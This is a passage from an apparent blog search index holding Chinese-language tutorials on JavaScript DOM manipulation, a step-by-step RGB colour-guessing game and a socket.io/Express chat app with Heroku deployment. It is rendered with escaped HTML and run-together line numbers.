tags = document.getElementsByClassName(“bolded”); var tags = document.getElementsByTagName(“li”); //select by ID 所有都可选择 var tag = document.querySelector(&quot;#highlight&quot;); //select by Class var tag = document.querySelector(&quot;.bolded&quot;); //select by tag var tag = document.querySelector(“h1”); //select by tag var tags = document.querySelectorAll(“h1”); //select by class var tags = document.querySelectorAll(&quot;.bolded&quot;); 交互dom changing an element’s style 123456789/SELECTvar tag = document.getElementById(&quot;highlight&quot;);//MANIPULATEtag.style.color = &quot;blue&quot;;tag.style.border = &quot;10px solid red&quot;;tag.style.fontSize = &quot;70px&quot;;tag.style.background = &quot;yellow&quot;;tag.style.marginTop = &quot;200px&quot;; adding/removing classes 12345678910111213141516/*DEFINE A CLASS IN CSS*/.another-class &#123; color: purple; fontSize: 76px;&#125;var tag = document.querySelector(&quot;h1&quot;);//ADD A CLASS TO THE SELECTED ELEMENTtag.classList.add(&quot;another-class&quot;);//REMOVE A CLASStag.classList.remove(&quot;another-class&quot;);//TOGGLE A CLASS 改变 如果有这个class就会变为没有，如果没有这个class就会添加。tag.classList.toggle(&quot;another-class&quot;); changing the content of a tag 1234567891011&lt;p&gt; This is an &lt;strong&gt;awesome&lt;/strong&gt; paragraph&lt;/p&gt;/Select the &lt;p&gt; tag:var tag = document.querySelector(&quot;p&quot;);//Retrieve the textContent:tag.textContent //&quot;This is an awesome paragraph&quot;//alter the textContent:tag.textContent = &quot;blah blah blah&quot;; 123456789&lt;p&gt; This is an &lt;strong&gt;awesome&lt;/strong&gt; paragraph&lt;/p&gt;//Select the &lt;p&gt; tag:var tag = document.querySelector(&quot;p&quot;);tag.innerHTML//&quot;This is an &lt;strong&gt;awesome&lt;/strong&gt; paragraph&quot; changing attributes(src, href, etc.) 12345678910111213&lt;a href=&quot;www.google.com&quot;&gt;I am a link&lt;/a&gt;&lt;img src=&quot;logo.png&quot;&gt;var link = document.querySelector(&quot;a&quot;);link.getAttribute(&quot;href&quot;); //&quot;www.google.com&quot;//CHANGE HREF ATTRIBUTElink.setAttribute(&quot;href&quot;,&quot;www.dogs.com&quot;);///&lt;a href=&quot;www.dogs.com&quot;&gt;I am a link&lt;/a&gt;//TO CHANGE THE IMAGE SRCvar img = document.querySelector(&quot;img&quot;);img.setAttribute(&quot;src&quot;, &quot;corgi.png&quot;);//&lt;img src=&quot;corgi.png&quot;&gt; DOM Events 123456789101112Clicking on a buttonHovering over a linkDragging and DroppingPressing the Enter keyTo add a listener, we use a method called addEventListenerelement.addEventListener(type, functionToCall);var button = document.querySelector(&quot;button&quot;);button.addEventListener(&quot;click&quot;, function() &#123; console.log(&quot;SOMEONE CLICKED THE BUTTON!&quot;);&#125;); 12345678910&lt;button&gt;Click Me&lt;/button&gt;&lt;p&gt;No One Has Clicked Me Yet&lt;/p&gt;var button = document.querySelector(&quot;button&quot;);var paragraph = document.querySelector(&quot;p&quot;);//SETUP CLICK LISTENERbutton.addEventListener(&quot;click&quot;, function() &#123; paragraph.textContent = &quot;Someone Clicked the Button!&quot;;&#125;); 案例1 1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Color Toggle&lt;/title&gt; &lt;style type=\"text/css\"&gt; .purple &#123; background: purple; &#125; &lt;/style&gt; &lt;script type=\"text/javascript\"&gt; var button = document.querySelector(\"button\"); // var isPurple = false; // button.addEventListener(\"click\", function()&#123; // if(isPurple)&#123; // document.body.style.background = \"white\"; // &#125; else &#123; // document.body.style.background = \"purple\"; // &#125; // isPurple = !isPurple; // &#125;);button.addEventListener(\"click\", function()&#123; document.body.classList.toggle(\"purple\");&#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;button&gt;CLICK ME&lt;/button&gt; &lt;script type=\"text/javascript\" src=\"toggle.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 综合案例：猜颜色 第一步：布局 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Color Game&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"colorGame.css\"&gt; &lt;style type=\"text/css\"&gt; body &#123; background-color: #232323;&#125;.square &#123; width: 30%; background: purple; padding-bottom: 30%; float: left; margin: 1.66%;&#125;#container &#123; margin: 0px auto; max-width: 600px;&#125;h1 &#123; color: white;&#125;&lt;/style&gt; &lt;script type=\"text/javascript\"&gt; var colors = [ \"rgb(255, 0, 0)\", \"rgb(255, 255, 0)\", \"rgb(0, 255, 0)\", \"rgb(0, 255, 255)\", \"rgb(0, 0, 255)\", \"rgb(255, 0, 255)\" ]; var squares = document.querySelectorAll(\".square\"); var pickedColor = colors[3]; var colorDisplay = document.getElementById(\"colorDisplay\"); colorDisplay.textContent = pickedColor; for(var i = 0; i &lt; squares.length; i++)&#123; // add initial colors to squares squares[i].style.backgroundColor = colors[i]; //add click listeners to squares squares[i].addEventListener(\"click\", function() &#123; //grab color of clicked squares var clickedColor = this.style.backgroundColor; //compare color to pickedColor if(clickedColor === pickedColor) &#123; alert(\"Correct!\"); &#125; else &#123; alert(\"WRONG!!!\"); &#125; &#125;); &#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt; The Great &lt;span id=\"colorDisplay\"&gt;RGB&lt;/span&gt; Color Game&lt;/h1&gt; &lt;div id=\"container\"&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;script type=\"text/javascript\" src=\"colorGame.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 第2步：点击事件 正确时显示同一颜色，不正确时为黑色。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Color Game&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"colorGame.css\"&gt; &lt;style type=\"text/css\"&gt; body &#123; background-color: #232323;&#125;.square &#123; width: 30%; background: purple; padding-bottom: 30%; float: left; margin: 1.66%;&#125;#container &#123; margin: 0px auto; max-width: 600px;&#125;h1 &#123; color: white;&#125;/*提示颜色白色*/span &#123; color: white;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt; The Great &lt;span id=\"colorDisplay\"&gt;RGB&lt;/span&gt; Color Game&lt;/h1&gt;&lt;!-- 提示 --&gt;&lt;div&gt; &lt;span id=\"message\"&gt;&lt;/span&gt;&lt;/div&gt; &lt;div id=\"container\"&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var colors = [ \"rgb(255, 0, 0)\", \"rgb(255, 255, 0)\", \"rgb(0, 255, 0)\", \"rgb(0, 255, 255)\", \"rgb(0, 0, 255)\", \"rgb(255, 0, 255)\" ]; // 正确后所有都为同一颜色 function changeColors(color) &#123; //loop through all squares for(var i = 0; i &lt; squares.length; i++) &#123; //change each color to match given color squares[i].style.backgroundColor = color; &#125; &#125;// 目标颜色随机 function pickColor() &#123; var random = Math.floor(Math.random() * colors.length); return colors[random]; &#125; var squares = document.querySelectorAll(\".square\"); var pickedColor = pickColor(); var colorDisplay = document.getElementById(\"colorDisplay\"); var messageDisplay = document.querySelector(\"#message\"); colorDisplay.textContent = pickedColor; for(var i = 0; i &lt; squares.length; i++)&#123; // add initial colors to squares squares[i].style.backgroundColor = colors[i]; //add click listeners to squares squares[i].addEventListener(\"click\", function() &#123; //grab color of clicked squares var clickedColor = this.style.backgroundColor; //compare color to pickedColor if(clickedColor === pickedColor) &#123; messageDisplay.textContent = \"Correct!\"; // 正确后所有都为同一颜色 changeColors(clickedColor); &#125; else &#123; // 不正确颜色为黑色 this.style.backgroundColor = \"#232323\"; messageDisplay.textContent = \"Try Again\"; &#125; &#125;); &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 第3步：随机颜色 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Color Game&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"colorGame.css\"&gt; &lt;style type=\"text/css\"&gt; body &#123; background-color: #232323;&#125;.square &#123; width: 30%; background: purple; padding-bottom: 30%; float: left; margin: 1.66%;&#125;#container &#123; margin: 0px auto; max-width: 600px;&#125;h1 &#123; color: white;&#125;/*提示颜色白色*/span &#123; color: white;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt; The Great &lt;span id=\"colorDisplay\"&gt;RGB&lt;/span&gt; Color Game&lt;/h1&gt;&lt;!-- 提示 --&gt;&lt;div&gt; &lt;span id=\"message\"&gt;&lt;/span&gt;&lt;/div&gt; &lt;div id=\"container\"&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; // 随机颜色 var colors = generateRandomColors(6); // 正确后所有都为同一颜色 function changeColors(color) &#123; //loop through all squares for(var i = 0; i &lt; squares.length; i++) &#123; //change each color to match given color squares[i].style.backgroundColor = color; &#125; &#125; // 目标颜色随机 function pickColor() &#123; var random = Math.floor(Math.random() * colors.length); return colors[random]; &#125; function generateRandomColors(num) &#123; //make an array var arr = []; //add num random colors to arr for(var i = 0; i &lt; num; i++) &#123; //get random color and push into arr arr.push(randomColor()); &#125; //return that array return arr;&#125;function randomColor() &#123; //pick a \"red\" from 0 - 255 var r = Math.floor(Math.random() * 256); //pick a \"green\" from 0 - 255 var g = Math.floor(Math.random() * 256); //pick a \"blue\" from 0 - 255 var b = Math.floor(Math.random() * 256); return \"rgb(\" + r + \", \" + g + \", \" + b + \")\";&#125; var squares = document.querySelectorAll(\".square\"); var pickedColor = pickColor(); var colorDisplay = document.getElementById(\"colorDisplay\"); var messageDisplay = document.querySelector(\"#message\");// 获取h1标签var h1 = document.querySelector(\"h1\"); colorDisplay.textContent = pickedColor; for(var i = 0; i &lt; squares.length; i++)&#123; // add initial colors to squares squares[i].style.backgroundColor = colors[i]; //add click listeners to squares squares[i].addEventListener(\"click\", function() &#123; //grab color of clicked squares var clickedColor = this.style.backgroundColor; //compare color to pickedColor if(clickedColor === pickedColor) &#123; messageDisplay.textContent = \"Correct!\"; // 正确后所有都为同一颜色 changeColors(clickedColor); // 将h1标签颜色变为指定颜色 h1.style.background = clickedColor; &#125; else &#123; this.style.backgroundColor = \"#232323\"; messageDisplay.textContent = \"Try Again\"; &#125; &#125;); &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 第4步：布局 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Color Game&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"colorGame.css\"&gt; &lt;style type=\"text/css\"&gt; body &#123; background-color: #232323; margin: 0;&#125;.square &#123; width: 30%; background: purple; padding-bottom: 30%; float: left; margin: 1.66%; border-radius: 15%; transation:background 0.6s;-webkit-transation:background 0.6s;-moz-transation:background 0.6s;&#125;#container &#123; margin: 0px auto; max-width: 600px;&#125;h1 &#123; text-align: center; color: white; background: steelblue; margin:0; text-transform: uppercase; font-weight: normal; padding: 20px 0;&#125;/*提示颜色白色*/span &#123; color: black;&#125;#stripe &#123; background: white; height: 30px; text-align: center; color: black;&#125;.selected &#123; background: blue;&#125;button&#123; border: none; background: none; text-transform: uppercase; height: 100%; font-weight: 700; color: steelblue; letter-spacing: 1px;&#125;/*中间的*/#message&#123; display: inline-block; width: 10%;&#125;button:hover&#123; color: white; background: steelblue; transition: all 0.3s;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt; The Great &lt;span id=\"colorDisplay\"&gt;RGB&lt;/span&gt; Color Game&lt;/h1&gt;&lt;!-- 信息横条--&gt;&lt;div id=\"stripe\"&gt; &lt;button id=\"reset\"&gt;New Colors&lt;/button&gt; &lt;span id=\"message\"&gt;&lt;/span&gt; &lt;button id=\"easyBtn\"&gt;Easy&lt;/button&gt; &lt;button id=\"hardBtn\" class=\"selected\"&gt;Hard&lt;/button&gt;&lt;/div&gt; &lt;div id=\"container\"&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;div class=\"square\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; // 随机颜色 var colors = generateRandomColors(6); var squares = document.querySelectorAll(\".square\"); var pickedColor = pickColor(); var colorDisplay = document.getElementById(\"colorDisplay\"); var messageDisplay = document.querySelector(\"#message\");// 获取h1标签var h1 = document.querySelector(\"h1\"); colorDisplay.textContent = pickedColor;// 点击按钮更换下一批颜色var resetButton = document.querySelector(\"#reset\");var numSquares = 6;var easyBtn = document.querySelector(\"#easyBtn\");var hardBtn = document.querySelector(\"#hardBtn\");easyBtn.addEventListener(\"click\", function() &#123; easyBtn.classList.add(\"selected\"); hardBtn.classList.remove(\"selected\"); numSquares = 3; colors = generateRandomColors(numSquares); pickedColor = pickColor(); colorDisplay.textContent = pickedColor; for(var i = 0; i &lt; squares.length; i++) &#123; if(colors[i]) &#123; squares[i].style.background = colors[i]; &#125; else &#123; squares[i].style.display = \"none\"; &#125; &#125;&#125;);hardBtn.addEventListener(\"click\", function() &#123; hardBtn.classList.add(\"selected\"); easyBtn.classList.remove(\"selected\"); numSquares = 6; colors = generateRandomColors(numSquares); pickedColor = pickColor(); colorDisplay.textContent = pickedColor; for(var i = 0; i &lt; squares.length; i++) &#123; squares[i].style.background = colors[i]; squares[i].style.display = \"block\"; &#125;&#125;);resetButton.addEventListener(\"click\", function() &#123; colors = generateRandomColors(numSquares); //pick a new random color from array pickedColor = pickColor(); //change colorDisplay to match picked Color colorDisplay.textContent = pickedColor; //change colors of squares for(var i = 0; i &lt; squares.length; i++) &#123; squares[i].style.background = colors[i]; &#125; h1.style.background = \"#232323\";&#125;); // 正确后所有都为同一颜色 function changeColors(color) &#123; //loop through all squares for(var i = 0; i &lt; squares.length; i++) &#123; //change each color to match given color squares[i].style.backgroundColor = color; &#125; &#125; // 目标颜色随机 function pickColor() &#123; var random = Math.floor(Math.random() * colors.length); return colors[random]; &#125; function generateRandomColors(num) &#123; //make an array var arr = []; //add num random colors to arr for(var i = 0; i &lt; num; i++) &#123; //get random color and push into arr arr.push(randomColor()); &#125; //return that array return arr;&#125;function randomColor() &#123; //pick a \"red\" from 0 - 255 var r = Math.floor(Math.random() * 256); //pick a \"green\" from 0 - 255 var g = Math.floor(Math.random() * 256); //pick a \"blue\" from 0 - 255 var b = Math.floor(Math.random() * 256); return \"rgb(\" + r + \", \" + g + \", \" + b + \")\";&#125; for(var i = 0; i &lt; squares.length; i++)&#123; // add initial colors to squares squares[i].style.backgroundColor = colors[i]; //add click listeners to squares squares[i].addEventListener(\"click\", function() &#123; //grab color of clicked squares var clickedColor = this.style.backgroundColor; //compare color to pickedColor if(clickedColor === pickedColor) &#123; messageDisplay.textContent = \"Correct!\"; resetButton.textContent = \"Play Again?\"; // 正确后所有都为同一颜色 changeColors(clickedColor); // 将h1标签颜色变为指定颜色 h1.style.background = clickedColor; &#125; else &#123; this.style.backgroundColor = \"#232323\"; messageDisplay.textContent = \"Try Again\"; &#125; &#125;); &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"js","slug":"js","permalink":"https://dreamerjonson.com/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://dreamerjonson.com/tags/js/"}]},{"title":"socket.io","slug":"node-socket-io","date":"2018-12-31T10:36:51.000Z","updated":"2019-01-17T15:59:53.314Z","comments":true,"path":"2018/12/31/node-socket-io/","link":"","permalink":"https://dreamerjonson.com/2018/12/31/node-socket-io/","excerpt":"","text":"项目目录 ├── package-lock.json ├── package.json ├── public │ └── index.html └── server └── server.js 初始化 npm init npm install --save express index.html 12345678910111213&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;Welcome to the chat app&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; server.js 12345678910111213const path = require('path');const express = require('express');//获取路劲，有讲究const publicPath = path.join(__dirname, '../public');const port = process.env.PORT || 3000;var app = express();app.use(express.static(publicPath));app.listen(port, () =&gt; &#123; console.log(`Server is up on $&#123;port&#125;`);&#125;); package.json 1234567891011121314151617181920&#123; &quot;name&quot;: &quot;node-chat-app&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;scripts&quot;: &#123; /* 启动脚本 */ &quot;start&quot;: &quot;node server/server.js&quot;, &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot; &#125;, /* node版本号 */ &quot;engines&quot;: &#123; &quot;node&quot;: &quot;10.13.0&quot; &#125;, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;dependencies&quot;: &#123; &quot;express&quot;: &quot;^4.14.0&quot; &#125;&#125; 部署hekuro 12&gt; heroku create&gt; git push https://git.heroku.com/rocky-shore-24556.git 使用socket.io 安装： 1npm install -save socket.io socket.io可以让服务器与客户端相互连接并触发事件。下例测试连接与断开服务器 server.html: 123456789101112131415161718192021222324const path = require('path');const http = require('http');const express = require('express');const socketIO = require('socket.io');const publicPath = path.join(__dirname, '../public');const port = process.env.PORT || 3000;var app = express();var server = http.createServer(app);var io = socketIO(server);app.use(express.static(publicPath));io.on('connection', (socket) =&gt; &#123; console.log('New user connected'); socket.on('disconnect', () =&gt; &#123; console.log('User was disconnected'); &#125;);&#125;);server.listen(port, () =&gt; &#123; console.log(`Server is up on $&#123;port&#125;`);&#125;); index.html: 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;Welcome to the chat app&lt;/p&gt; &lt;script src=\"/socket.io/socket.io.js\"&gt;&lt;/script&gt; &lt;script&gt; var socket = io(); socket.on('connect', () =&gt; &#123; console.log('Connected to server'); &#125;); socket.on('disconnect', () =&gt; &#123; console.log('Disconnected from server'); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 运行：打开localhost:3000即可运行，查看控制台输出的语句。 1&gt; node server/server.js ##项目目录重构 创建和触发自定义事件。 将客户端js代码分离出来： |—— node_moudles ├── package-lock.json ├── package.json ├── public │ ├── index.html │ └── js │ └── index.js └── server └── server.js index.html: 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;Welcome to the chat app&lt;/p&gt; &lt;script src=\"/socket.io/socket.io.js\"&gt;&lt;/script&gt; &lt;script src=\"/js/index.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; index.js: 为了让浏览器识别，将匿名函数修改为function 123456789101112131415161718var socket = io();socket.on('connect', function () &#123; console.log('Connected to server'); socket.emit('createMessage', &#123; from: 'Andrew', text: 'Yup, that works for me.' &#125;);&#125;);socket.on('disconnect', function () &#123; console.log('Disconnected from server');&#125;);socket.on('newMessage', function (message) &#123; console.log('newMessage', message);&#125;); server.js: 12345678910111213141516171819202122232425262728293031323334const path = require('path');const http = require('http');const express = require('express');const socketIO = require('socket.io');const publicPath = path.join(__dirname, '../public');const port = process.env.PORT || 3000;var app = express();var server = http.createServer(app);var io = socketIO(server);app.use(express.static(publicPath));io.on('connection', (socket) =&gt; &#123; console.log('New user connected'); socket.emit('newMessage', &#123; from: 'John', text: 'See you then', createdAt: 123123 &#125;); socket.on('createMessage', (message) =&gt; &#123; console.log('createMessage', message); &#125;); socket.on('disconnect', () =&gt; &#123; console.log('User was disconnected'); &#125;);&#125;);server.listen(port, () =&gt; &#123; console.log(`Server is up on $&#123;port&#125;`);&#125;); 运行：打开localhost:3000即可运行，查看控制台输出的语句。 1&gt; node server/server.js 广播 当客户端连接服务器之后，所有的节点即会触发newMessage事件，但是当前连接的客户端与其他客户端接受的信息不相同。 当前客户端接受：Welcome to the chat app 其他客户端接受：New user joined index.html: 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;Welcome to the chat app&lt;/p&gt; &lt;script src=\"/socket.io/socket.io.js\"&gt;&lt;/script&gt; &lt;script src=\"/js/index.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; index.js: 为了让浏览器识别，将匿名函数修改为function 12345678910111213var socket = io();socket.on('connect', function () &#123; console.log('Connected to server');&#125;);socket.on('disconnect', function () &#123; console.log('Disconnected from server');&#125;);socket.on('newMessage', function (message) &#123; console.log('newMessage', message);&#125;); server.js: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152const path = require('path');const http = require('http');const express = require('express');const socketIO = require('socket.io');const publicPath = path.join(__dirname, '../public');const port = process.env.PORT || 3000;var app = express();var server = http.createServer(app);var io = socketIO(server);app.use(express.static(publicPath));io.on('connection', (socket) =&gt; &#123; console.log('New user connected');// 当客户端连接之后，即会触发newMessage事件，但是当前连接的客户端与其他客户端接受的信息不相同。 // 只发送给当前连接的节点 socket.emit('newMessage', &#123; from: 'Admin', text: 'Welcome to the chat app', createdAt: new Date().getTime() &#125;); // 只发送给当前连接的节点发送给其他节点 socket.broadcast.emit('newMessage', &#123; from: 'Admin', text: 'New user joined', createdAt: new Date().getTime() &#125;); socket.on('createMessage', (message) =&gt; &#123; console.log('createMessage', message); io.emit('newMessage', &#123; from: message.from, text: message.text, createdAt: new Date().getTime() &#125;); // socket.broadcast.emit('newMessage', &#123; // from: message.from, // text: message.text, // createdAt: new Date().getTime() // &#125;); &#125;); socket.on('disconnect', () =&gt; &#123; console.log('User was disconnected'); &#125;);&#125;);server.listen(port, () =&gt; &#123; console.log(`Server is up on $&#123;port&#125;`);&#125;); 测试 运行： 1&gt; node server/server.js 分别打开两个浏览器tabs， 打开localhost:3000查看控制台输出的语句。 封装产生信息 目录 ├── package-lock.json ├── package.json ├── public │ ├── index.html │ └── js │ └── index.js └── server ├── server.js └── utils └── message.js index.html: 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;Welcome to the chat app&lt;/p&gt; &lt;script src=\"/socket.io/socket.io.js\"&gt;&lt;/script&gt; &lt;script src=\"/js/index.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; index.js: 为了让浏览器识别，将匿名函数修改为function 12345678910111213var socket = io();socket.on('connect', function () &#123; console.log('Connected to server');&#125;);socket.on('disconnect', function () &#123; console.log('Disconnected from server');&#125;);socket.on('newMessage', function (message) &#123; console.log('newMessage', message);&#125;); message.js 123456789var generateMessage = (from, text) =&gt; &#123; return &#123; from, text, createdAt: new Date().getTime() &#125;;&#125;;module.exports = &#123;generateMessage&#125;; server.js 123456789101112131415161718192021222324252627282930313233343536373839const path = require('path');const http = require('http');const express = require('express');const socketIO = require('socket.io');const &#123;generateMessage&#125; = require('./utils/message');const publicPath = path.join(__dirname, '../public');const port = process.env.PORT || 3000;var app = express();var server = http.createServer(app);var io = socketIO(server);app.use(express.static(publicPath));io.on('connection', (socket) =&gt; &#123; console.log('New user connected'); socket.emit('newMessage', generateMessage('Admin', 'Welcome to the chat app')); socket.broadcast.emit('newMessage', generateMessage('Admin', 'New user joined')); socket.on('createMessage', (message) =&gt; &#123; console.log('createMessage', message); io.emit('newMessage', generateMessage(message.from, message.text)); // socket.broadcast.emit('newMessage', &#123; // from: message.from, // text: message.text, // createdAt: new Date().getTime() // &#125;); &#125;); socket.on('disconnect', () =&gt; &#123; console.log('User was disconnected'); &#125;);&#125;);server.listen(port, () =&gt; &#123; console.log(`Server is up on $&#123;port&#125;`);&#125;); 测试 运行： 1&gt; node server/server.js 分别打开两个浏览器tabs， 打开localhost:3000查看控制台输出的语句。 信息反馈 当客户端发出一条消息，希望得到服务器的反馈，如果服务器发送成功个，会收到消息。 index.html: 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;Welcome to the chat app&lt;/p&gt; &lt;script src=\"/socket.io/socket.io.js\"&gt;&lt;/script&gt; &lt;script src=\"/js/index.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; index.js: 为了让浏览器识别，将匿名函数修改为function 1234567891011121314151617181920var socket = io();socket.on('connect', function () &#123; console.log('Connected to server');&#125;);socket.on('disconnect', function () &#123; console.log('Disconnected from server');&#125;);socket.on('newMessage', function (message) &#123; console.log('newMessage', message);&#125;);socket.emit('createMessage', &#123; from: 'Frank', text: 'Hi'&#125;, function (data) &#123;//回调函数 console.log('Got it', data);&#125;); message.js 123456789var generateMessage = (from, text) =&gt; &#123; return &#123; from, text, createdAt: new Date().getTime() &#125;;&#125;;module.exports = &#123;generateMessage&#125;; server.js 12345678910111213141516171819202122232425262728293031323334353637383940const path = require('path');const http = require('http');const express = require('express');const socketIO = require('socket.io');const &#123;generateMessage&#125; = require('./utils/message');const publicPath = path.join(__dirname, '../public');const port = process.env.PORT || 3000;var app = express();var server = http.createServer(app);var io = socketIO(server);app.use(express.static(publicPath));io.on('connection', (socket) =&gt; &#123; console.log('New user connected'); socket.emit('newMessage', generateMessage('Admin', 'Welcome to the chat app')); socket.broadcast.emit('newMessage', generateMessage('Admin', 'New user joined')); socket.on('createMessage', (message, callback) =&gt; &#123; console.log('createMessage', message); io.emit('newMessage', generateMessage(message.from, message.text)); callback('This is from the server.'); //客户端执行回调函数 // socket.broadcast.emit('newMessage', &#123; // from: message.from, // text: message.text, // createdAt: new Date().getTime() // &#125;); &#125;); socket.on('disconnect', () =&gt; &#123; console.log('User was disconnected'); &#125;);&#125;);server.listen(port, () =&gt; &#123; console.log(`Server is up on $&#123;port&#125;`);&#125;); 测试 运行： 1&gt; node server/server.js 分别打开两个浏览器tabs， 打开localhost:3000查看控制台输出的语句。 ## 简单聊天页面 index.html: 1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;Welcome to the chat app&lt;/p&gt; &lt;script src=\"/socket.io/socket.io.js\"&gt;&lt;/script&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.min.js\" integrity=\"sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;ol id=\"messages\"&gt;&lt;/ol&gt;&lt;form id=\"message-form\"&gt; &lt;input name=\"message\" type=\"text\" placeholder=\"Message\"/&gt; &lt;button&gt;Send&lt;/button&gt;&lt;/form&gt; &lt;script src=\"/js/index.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; index.js: 为了让浏览器识别，将匿名函数修改为function 1234567891011121314151617181920212223242526272829 var socket = io(); socket.on('connect', function () &#123; console.log('Connected to server'); &#125;); socket.on('disconnect', function () &#123; console.log('Disconnected from server'); &#125;);//新消息来了之后，添加到页面中 socket.on('newMessage', function (message) &#123; console.log('newMessage', message); var li = jQuery('&lt;li&gt;&lt;/li&gt;'); li.text(`$&#123;message.from&#125;: $&#123;message.text&#125;`); jQuery('#messages').append(li); &#125;); //按钮提交事件 jQuery('#message-form').on('submit', function (e) &#123; e.preventDefault(); socket.emit('createMessage', &#123; from: 'User', text: jQuery('[name=message]').val() &#125;, function () &#123; &#125;); &#125;); message.js 123456789var generateMessage = (from, text) =&gt; &#123; return &#123; from, text, createdAt: new Date().getTime() &#125;;&#125;;module.exports = &#123;generateMessage&#125;; server.js 12345678910111213141516171819202122232425262728293031323334353637383940const path = require('path');const http = 